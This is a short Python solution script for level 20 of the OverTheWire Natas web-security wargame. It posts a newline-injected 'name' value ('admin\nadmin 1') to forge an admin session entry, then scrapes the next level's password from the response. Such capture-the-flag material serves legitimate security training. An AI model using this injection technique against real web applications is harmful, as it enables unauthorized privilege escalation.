import requests
import re
from natas_utility import *
import html

current_level = 20
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url

data = {'name': 'admin\nadmin 1',
        'submit': 'submit'}

session = requests.session()
response = session.post(url, data=data, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')

get = session.get(url=url, auth=auth)

password_regex = re.compile(r'natas21\nPassword: (.+)</pre>\r\n')
next_password = password_regex.findall(get.content.decode('utf-8'))[0]
print(next_password)

save_credentials(current_level + 1, next_password)
